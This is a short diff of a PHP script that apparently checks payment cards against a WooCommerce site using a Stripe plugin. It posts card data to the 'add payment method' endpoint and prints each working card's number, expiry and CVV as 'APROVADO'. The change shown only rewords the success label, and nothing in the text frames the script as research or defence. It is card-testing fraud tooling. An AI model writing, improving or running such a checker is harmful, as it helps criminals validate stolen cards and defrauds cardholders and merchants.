@@ -147,7 +147,7 @@ curl_setopt($c, CURLOPT_POSTFIELDS, 'payment_method=eh_stripe_pay&paypal_credit_
 $success = curl_exec($c);
 
 if (stripos($success, 'Payment method successfully added.')){
-  echo '<span class="badge badge-success">✅ # APROVADO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-success">[Pagamento Aprovado!] @Haika </span><br>';
+  echo '<span class="badge badge-success">✅ # APROVADO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-success">[Cartão Vinculado Com Sucesso!] @Haika </span><br>';
 }else {
    $message = getStr($success, '<ul class="woocommerce-error" role="alert">','</li>');
    $message = str_replace('<li>', '', $message);
